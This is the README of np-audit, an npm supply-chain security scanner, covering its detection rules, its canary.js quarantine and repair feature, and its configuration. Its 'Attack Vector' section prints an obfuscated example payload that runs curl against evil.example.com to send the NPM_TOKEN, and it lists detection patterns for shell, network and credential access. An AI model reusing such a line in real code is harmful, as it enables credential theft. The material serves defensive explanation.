![np-audit](docs/title-image.png)

[![npm version](https://img.shields.io/npm/v/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm downloads](https://img.shields.io/npm/dm/np-audit.svg)](https://www.npmjs.com/package/np-audit)
[![npm package size](https://img.shields.io/npm/unpacked-size/np-audit)](https://www.npmjs.com/package/np-audit)
[![GitHub license](https://img.shields.io/github/license/KoblerS/np-audit.svg)](https://github.com/KoblerS/np-audit/blob/main/LICENSE)
[![CI](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml/badge.svg)](https://github.com/KoblerS/np-audit/actions/workflows/ci.yml)
[![codecov](https://codecov.io/gh/KoblerS/np-audit/branch/main/graph/badge.svg)](https://codecov.io/gh/KoblerS/np-audit)

# np-audit — npm package auditor

Static security analysis for npm packages — detects obfuscated lifecycle scripts, known vulnerabilities, and malicious patterns **before** they run. Drop-in replacement for `npm install` and `npm ci`.

**Zero dependencies.** Pure Node.js built-ins only. **< 100 kB** on the wire.

```bash
npx np-audit scan express
```

```bash
npm install -g np-audit
npa scan                     # scan all deps
npa install                  # audit then install
alias npm='npa'              # use as drop-in replacement
```

---

## Marshallers

Detection is split into modular marshallers — each one detects a single attack signal:

| Marshaller | What it detects | Score |
| ---------- | --------------- | ----- |
| `eval/dynamic-exec` | `eval()`, `new Function()`, indirect eval, `vm.*`, `setTimeout` with string | 8 |
| `obfuscator.io` | `_0x` variable naming patterns (obfuscator.io output) | 9–80 |
| `high-entropy-string` | Long strings or concatenation chains with high Shannon entropy | 6 |
| `hex-escape-density` | Dense `\xNN` and `\uXXXX` escape sequences | 5–50 |
| `fromCharCode` | `String.fromCharCode` with many args, large decimal char-code arrays | 7 |
| `encoded-decode` | Base64/hex decode (`atob`, `Buffer.from`) optionally combined with `eval` | 3–8 |
| `child-process` | `require('child_process')`, `exec`, `spawn`, `fork`, worker_threads | 5 |
| `hex-array` | Large numbers of `0x` hex literal values | 7–60 |
| `process-env` | `process.env` access (credential exfiltration signal) | 3 |
| `network-call` | `require('https')`, `fetch()`, `dns`, `net`, `tls` | 4 |
| `filesystem-manipulation` | `fs.writeFile`, `chmod`, `symlink` (backdoor persistence) | 3–4 |
| `runtime-download` | Downloads and executes external runtimes (Bun, Deno) | 9–50 |
| `vscode-autorun` | VS Code tasks with `runOn: folderOpen` (auto-execution) | 30 |
| `known-vulnerability` | Known CVEs via Snyk API or OSV.dev | 4–6 (WARN), 80 (malicious) |

Scores scale with severity — higher counts of obfuscation indicators produce higher scores. The final verdict is based on the highest individual score across all marshallers.

See [CONTRIBUTING.md](CONTRIBUTING.md) for how to write custom marshallers.

---

## Vulnerability Scanning (CVE)

Every scanned package is checked against known vulnerability databases alongside the code analysis.

**Default: OSV.dev (no setup required)**

Works out of the box — queries the free [OSV.dev](https://osv.dev/) API for known vulnerabilities and malicious package advisories.

**Optional: Snyk API (richer data)**

```bash
# Environment variable
export SNYK_API_TOKEN=your-token-here

# Or via Snyk CLI
snyk auth
```

Token resolution order: `SNYK_API_TOKEN` → `SNYK_TOKEN` → `~/.config/configstore/snyk.json`

| Severity | Score | Verdict |
| -------- | ----- | ------- |
| Malicious package | 80 | DANGER |
| 10+ vulnerabilities | 6 | WARN |
| 5–9 vulnerabilities | 5 | WARN |
| 1–4 vulnerabilities | 4 | WARN |

Non-malicious CVEs produce warnings but never block installation. Only confirmed malicious packages trigger DANGER.

---

## Canary Killer (optional repository scan)

Canary Killer is the optional repository scan for project scripts, configured Git hooks and residual files under explicit local roots. It complements the dependency audit by inspecting files already present on disk, including missing-target references and separately supplied temporary directories. Scans are read-only by default. Optional protection removes confirmed direct canary calls, quarantines exact `canary.js` files and adds Git ignore rules.

### Architecture

The command is registered through the existing command loader. Its separate repository orchestrator keeps coverage reporting and indicator/review findings distinct from the dependency audit's package scores and vulnerability verdicts.

| Component | Role |
| --- | --- |
| [Command](src/commands/canary-killer.js) and [repository scanner](src/core/repositoryScanner.js) | Parse explicit roots/exclusions; traverse local files; report findings, references and coverage gaps |
| [Command parser](src/utils/command.js) and [import extraction](src/core/requireWalker.js) | Reuse existing static target parsing without executing targets |
| Existing network, environment and filesystem [marshallers](src/marshallers/) | Supply shared detection signals alongside repository-specific behavior patterns |
| [Output helpers](src/utils/output.js) | Reuse terminal formatting; emit repository-specific JSON/text reports |
| [Quarantine helper](src/core/canaryQuarantine.js) | On explicit `--quarantine`, move discovered `canary.js` files and append ignore rules; preserve the file contents and report each action |
| [Reference repair](src/core/canaryRepair.js) and [protection gate](src/core/canaryProtection.js) | Remove confirmed direct calls, preserve remaining commands, and block controlled commands when protection fails |

The standalone repository command bypasses user audit configuration, registry/vulnerability requests and update checks. The dependency audit retains its existing behavior unless canary protection is enabled; enabled protection runs before auditing and again immediately before controlled npm launches.

### Run from a checkout

Node.js 18 or newer and a local checkout containing this implementation are required. From the np-audit checkout directory, run the CLI file directly; no global np-audit install, npm alias or package download is required:

```bash
node bin/npa.js canary-killer . --json
```

Here, `.` explicitly selects the np-audit checkout as the scan root. To inspect another repository or directories on the machine where Node is running, use the CLI's actual checkout path:

```bash
node /path/to/np-audit/bin/npa.js canary-killer /path/to/checkout --json
node /path/to/np-audit/bin/npa.js canary-killer /srv/app /dev/shm /tmp
node /path/to/np-audit/bin/npa.js canary-killer ./checkout --exclude ./checkout/node_modules
```

### Opt-in quarantine

From the np-audit checkout, scan selected directory roots and quarantine discovered `canary.js` files:

```bash
node bin/npa.js canary-killer /path/to/repository --quarantine --json
node bin/npa.js canary-killer /srv/app /dev/shm --quarantine --json
```

This option removes confirmed direct canary calls from package scripts and hooks, moves regular `canary.js` files into `.np-audit-quarantine/`, and appends `canary.js` plus `.np-audit-quarantine/` to `.gitignore`. It applies by filename, including legitimate canary tests; quarantine is not a malware verdict. Explicit exclusions remain respected. Single-file roots remain available for read-only scanning; quarantine requires directory roots.

Each file is moved into a separate entry directory as `payload.quarantined`. A `metadata.json` records its original path, quarantine path, size, original permission mode and action time. File contents are preserved. The helper uses the nearest discovered Git repository root within the supplied roots, or the most specific supplied directory root when no repository is discovered. Quarantine storage and `.gitignore` writes stay inside supplied roots, and symlinks/reparse points are refused. Existing ignore content is preserved; repeated actions do not duplicate the appended block. Git index and history remain unchanged, so ignore rules do not remove already tracked content or prevent forced staging.

The JSON `repairs` and `quarantine.actions` lists and text output report original command text, replacements, paths, destinations, ignore updates and failures. The report retains pre-action evidence and coverage gaps, then rescans to report the current state. Quarantine storage is explicitly excluded from analysis and reported. Successful protection can still return exit code `2` from the standalone scan for incomplete overall coverage; `protection.allowed` reports whether the narrower canary protection checks succeeded.

For `"build": "node canary.js && tsc"`, repair preserves `"build": "tsc"`. A prepare entry containing only `node canary.js` is removed. Confirmed direct hook calls receive the same treatment. Repair also handles these references when the file is already missing. Only recognizable direct commands and simple `&&` chains are rewritten. Ambiguous conditions, pipelines or other unsupported canary calls are reported and block protection instead of being guessed. No scanned command is executed during protection.

### Automatic protection before controlled commands

To enable protection for a project, add these settings to its `.npmauditor.json`, preserving any existing settings:

```json
{
  "canaryProtection": true,
  "canaryRoots": []
}
```

The current project directory is always included. `canaryRoots` adds explicitly selected directories, such as `/dev/shm`; relative entries resolve from the command's working directory. Enabled protection runs for `scan`, `install`, `ci` and npm commands forwarded through np-audit. `--skip` and `--review` do not bypass it. For one command without changing configuration, run from the project directory:

```bash
node /path/to/np-audit/bin/npa.js run build --protect-canary
```

Protection discovers filenames throughout selected roots and reads manifests, hooks, Git configuration and `canary.js` contents. Other files are counted as filename-only coverage; use the standalone read-only scan for behavior matching in renamed files. Unreadable paths, discovery limits, unsupported hook configuration, failed actions and remaining canary references block the controlled command. Expected Git object/index and quarantine-storage exclusions remain reported but do not alone block this specific protection policy. Global npm operations and commands selecting another project with `--prefix` or `-C` are refused while protection is enabled.

In plain English: np-audit checks and repairs the selected folders before starting commands it launches. If protection fails, it stops the command. Running `npm`, `node` or a shell directly bypasses that check. Protection cannot undo code that already ran, supervise files introduced after a check or stop an already running process. No continuous watcher is installed. Quarantine is a filesystem move, not an isolated execution environment; use stable files while applying actions.

### Scope and reporting

Supply every standalone scan root explicitly. Paths and repeated `--exclude <path>` options resolve from the current directory. Temporary directories, hidden files, untracked files and `node_modules` are scanned when present under supplied roots; there is no name-based exclusion for `/dev/shm` or `/tmp`. A root may also be an individual regular file. The default repository command only reads local files; `--quarantine` permits the actions above. Neither repository-command mode invokes npm, Git, hooks, scanned scripts, downloads or repository-configured external commands, or runs registry, vulnerability or update checks. Automatic protection also performs its checks without subprocesses or network calls; after successful protection, the controlled command continues with its normal audit/npm behavior.

The scan examines all `package.json` scripts (including build and preparation), resolves recognizable literal local interpreter/direct-script targets, and records existing, missing and unresolved references. Local JavaScript imports use np-audit's existing import extraction and a limited extension/index search. It reads local `.git/config`, `config.worktree`, unconditional literal includes, `.git` worktree pointers and `commondir`, and inspects default and configured `core.hooksPath` directories. Paths outside supplied roots require another explicit root. Versioned `.husky`/`.githooks` files are also inspected as text. System/global Git configuration, environment overrides, conditional includes, runtime options with complex resolution, inline JavaScript local-import resolution, package-name imports, arbitrary shell syntax and full Node module resolution are unsupported; dynamic and unrecognized command entry points are reported as unresolved. A bare Git repository is not inferred from an ordinary directory root.

Behavior findings explain download-to-shell pipelines/substitutions, saved downloads passed to shells, host/user/environment collection alongside network primitives, and commands that write scripts or assign executable permissions after file creation. Collection/network co-occurrence does not prove data flow. Matching is heuristic and can flag comments, quoted examples, test fixtures and legitimate setup tools. Renamed files are inspected by content; `canary.js` is an informational search indicator, never proof of malware. `package.jsonl` is a nonstandard text file and is never parsed as an npm manifest. Reports do not attribute the motivating incident or establish a connection to published malware cases.

JSON and text reports include absolute paths, source lines, bounded evidence, reference targets/statuses, inspected paths, unreadable paths, exclusions, hook/config coverage and limitations. Evidence is capped at 240 characters with an explicit truncation flag; terminal control characters are escaped in text output. The scan is bounded to 10,000 text files, 20,000 traversal entries, 1 MiB per file, a 32 MiB content budget (plus one-byte overflow checks), 2,000 finding/reference/gap/configuration records and 100 directory levels. Symlinks/reparse points and special files are not followed; binary/non-UTF-8 content and Git metadata other than hook/config files and pointers are excluded and reported. A limit, exclusion, read failure or unresolved reference makes coverage **incomplete**. Git checkouts normally report incomplete coverage because Git object/index metadata is deliberately excluded. Output never labels a repository clean.

Quarantine uses two bounded scan passes. Filename discovery also records regular `canary.js` files whose contents cannot be analyzed; `--quarantine` can move them without reading their contents, while retaining the original coverage gap. Ignore-file reads are limited to 128 KiB per file and 32 MiB total per action pass. Oversized or unsupported ignore files and filesystem failures are reported as failed actions.

Protection regression tests verify preserved build commands, removed prepare/hook calls, missing targets, ambiguous-command blocking and action failures. Mocked CLI tests record npm launches and assert protection finishes before launch, including a file introduced during auditing. The live integration test runs the actual CLI, dependency audit and npm: it verifies read-only scanning, quarantine with an explicit temporary root, protected `scan`, `npm prefix`, dependency-free offline `install`/`ci`, and failure blocking. npm scripts are disabled; fixture scripts, hooks and downloaded content are never executed. These tests do not verify a real application build, deployment or host integrity.

Protected Windows npm launches use the installed `npm-cli.js` entry point beside Node or a PATH directory, passing arguments directly to Node. This avoids attempting to spawn `npm.cmd` without a shell. A missing compatible npm entry point or a failed launch returns an error. Nonstandard Windows npm wrapper layouts are unsupported by this protected launch path.

Exit codes are `0` for complete coverage without behavior-review findings, `1` for behavior-review findings, and `2` for incomplete coverage or invalid arguments (`2` takes precedence). Informational canary/nonstandard-file indicators alone do not cause exit `1`. A GitHub repository is supported through its local checkout: the scan cannot inspect another machine's untracked files or local `.git/hooks`. No scan establishes host integrity, recovers deleted content or reconstructs a previously executed payload. For consistent results, scan a stable filesystem snapshot; this is not a hardened forensic reader for a concurrently changing hostile filesystem.

### Incident-derived reconstruction

The [incident-derived reconstruction fixtures](test/fixtures/incident-derived-reconstruction/README.md) preserve the confirmed `package.json` build and prepare references, provide inert download-to-shell text at a reserved `.invalid` URL, and include a representative Git hook. A second state leaves the manifest and hook references intact after `canary.js` is removed. An additional temporary-directory fixture represents the reported file under `/dev/shm` and is scanned only when its root is explicitly supplied.

The [regression test](test/unit/incident-derived-reconstruction.test.js) verifies existing/missing targets, paths, lines, evidence, configured hooks, behavior matches and incomplete coverage. It asserts unchanged inputs and zero subprocess or network calls during scanning. It never runs the fixture's build, prepare, canary or hook. From the np-audit checkout, run only the test harness:

```bash
node test/unit/incident-derived-reconstruction.test.js
```

This is an incident-derived reconstruction, not an exact reproduction. The original payload, effects, origin and full original hook behavior remain unknown. The supplied incident record supports the historical HTTP-to-Bash description. Read-only inspection of the linked [current canary source](https://github.com/electricwolfemarshmallowhypertext/stateful-ai-research/blob/main/canary.js) confirms `child_process.exec` with a hardcoded HTTP download piped to Bash and `|| true`, but does not reconstruct the historical fetched content. The webhook was not contacted and the source was not executed. Tests validate detection against known characteristics; they do not prove compromise.

### Supporting advisories

- [OSV MAL-2026-17642](https://osv.dev/vulnerability/MAL-2026-17642): an install hook ran `canary.js` and transmitted host/user and CI information.
- [GHSA-p77h-h8r5-pv82](https://github.com/advisories/GHSA-p77h-h8r5-pv82): an install hook ran `src/canary.js` to send network beacons.

These advisories document comparable attack patterns. Detection here is grounded in the verified current `canary.js` download-to-Bash command and `package.json` build/prepare references, together with the supplied incident record. The historical fetched payload and full original hook behavior remain unknown.

---

## Usage

### Commands

| Command                        | Alias       | Description                        |
| ------------------------------ | ----------- | ---------------------------------- |
| `npa install [package]`        | `npa i`     | Audit then run `npm install`       |
| `npa ci`                       | —           | Audit then run `npm ci`            |
| `npa scan [package]`           | `npa s`     | Scan only, no install              |
| `npa canary-killer <root> [root...]` | —      | [Optional repository scan](#canary-killer-optional-repository-scan) |
| `npa config get`               | `npa c get` | Show current configuration         |
| `npa config set <key> <value>` | `npa c set` | Update a config value              |
| `npa alias --install`          | —           | Install shell alias                |
| `npa alias --uninstall`        | —           | Remove shell alias                 |

Any unrecognized command is forwarded to npm (e.g. `npa run test`, `npa publish`).

### Flags

| Flag        | Alias | Works with              | Description                                      |
| ----------- | ----- | ----------------------- | ------------------------------------------------ |
| `--review`  | `-r`  | `install`, `ci`         | Interactive mode — choose which scripts to allow |
| `--json`    | —     | `install`, `ci`, `scan`, `canary-killer` | Machine-readable JSON output                     |
| `--quarantine` | —  | `canary-killer`         | Repair direct canary calls, quarantine files and append ignore rules |
| `--protect-canary` | — | `scan`, `install`, `ci`, forwarded npm commands | Enable protection for this command |
| `--no-dev`  | —     | `install`, `ci`, `scan` | Skip devDependencies                             |
| `--verbose` | —     | `install`, `ci`, `scan` | Show fetch progress and extra detail             |
| `--skip`    | —     | `install`, `ci`         | Skip auditing for this command                   |
| `--version` | `-v`  | —                       | Print version and exit                           |
| `--help`    | `-h`  | —                       | Print help and exit                              |

### Interactive `--review` mode

```bash
npa install --review
```

```
  npa --review mode
  Use ↑/↓ to navigate, SPACE to toggle, ENTER to confirm, q to quit

  Found 3 package(s) with install scripts:

     [✓ allow] esbuild@0.24.2       postinstall: post-install.js     OK
   ▶ [✗ deny ] evil-sdk@1.0.0       postinstall: install.js          DANGER (score: 9)
     [✓ allow] @scope/pkg@2.1.0     postinstall: install.js          WARN (score: 5)

  2 allowed  1 denied
```

---

## Configuration

Config is stored in `~/.npmauditor.json` (global) and can be overridden per project with `.npmauditor.json`.

```bash
npa config get                              # Show current config
npa config set blockScore 6                 # Block at score 6+
npa config set skipPackages '["esbuild"]'   # Trust specific packages
npa config set skipScopes '["@types"]'      # Trust entire scopes
```

### All config keys

| Key               | Default                      | Description                             |
| ----------------- | ---------------------------- | --------------------------------------- |
| `blockScore`      | `7`                          | Score threshold for DANGER (exit 1)     |
| `warnScore`       | `4`                          | Score threshold for WARN (exit 0)       |
| `registry`        | `https://registry.npmjs.org` | npm registry URL                        |
| `timeout`         | `30000`                      | HTTP request timeout (ms)               |
| `parallelFetches` | `5`                          | Concurrent downloads                    |
| `skipScopes`      | `[]`                         | `@scope` prefixes to skip               |
| `skipPackages`    | `[]`                         | Package names to skip                   |
| `silent`          | `false`                      | Suppress output when no issues found    |
| `scanSelf`        | `true`                       | Scan own project lifecycle scripts      |
| `maxTarballSize`  | `50MB`                       | Max unpacked tarball size (bomb protection) |
| `checkVulnerabilities` | `true`                  | Check packages against CVE databases    |
| `deepResolve`     | `false`                      | Resolve full transitive dependency tree |
| `disabledMarshallers` | `[]`                    | Marshaller names to skip during scanning |

### Disabling marshallers

You can disable specific detection checks by adding their names to `disabledMarshallers`:

```bash
npa config set disabledMarshallers '["process-env", "network-call"]'
```

To see all available marshaller names and their current status:

```bash
npa config marshallers
```

This is useful when a marshaller produces false positives for your workflow. Disabled marshallers are skipped entirely during both static code analysis and package-level checks.

---

## Shell Alias

Use npa as a transparent npm replacement:

```bash
npa alias --install     # adds: alias npm='npa'
source ~/.zshrc         # reload shell
```

Now `npm install`, `npm ci` scan automatically. All other npm commands (`npm run`, `npm test`, `npm publish`) pass through unchanged.

```bash
npa alias --uninstall   # remove the alias
```

---

## How It Works

1. **Parse** `package-lock.json` (v1/v2/v3) or resolve from `package.json`
2. **Fetch** tarballs from registry (or read from `node_modules`)
3. **Parse** lifecycle commands — splits `&&`/`||`/`;`/`|`, handles `node -e`, `sh -c`, shell scripts
4. **Walk** the `require()`/`import` graph from each entry (cycle detection, 50 file / 5 MB cap)
5. **Analyze** with all marshallers — static code checks + CVE database queries
6. **Score** and classify: DANGER / WARN / OK
7. **Report** or proceed with install

---

## The Attack Vector

Supply chain attacks abuse npm lifecycle scripts. When you run `npm install`, any `preinstall`/`install`/`postinstall` script runs automatically. Attackers hide payloads behind obfuscation:

```js
var _0x3f2a = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\'child_process\').exec(\'curl http://evil.example.com/\'+process.env.NPM_TOKEN)');
```

Real-world incidents:

- **[event-stream (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)** — Bitcoin wallet credential theft
- **[ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w)** — crypto miner + info-stealer
- **[node-ipc (2022)](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)** — geo-targeted wiper malware
- **[colors / faker (2022)](https://snyk.io/blog/open-source-npm-packages-colors-faker/)** — maintainer sabotage
- **[SAP CAP / cds-dbs (2025)](https://community.sap.com/t5/technology-blog-posts-by-sap/cap-developers-call-to-action-to-mitigate-and-apply-solution-provided-in/ba-p/14387683)** — compromised package targeting enterprise developers

`npa` **never executes** scripts. It downloads and statically analyzes them.

---

## Exit Codes

| Code | Meaning                             |
| ---- | ----------------------------------- |
| `0`  | All clean or only warnings          |
| `1`  | One or more packages blocked        |

---

## License

MIT
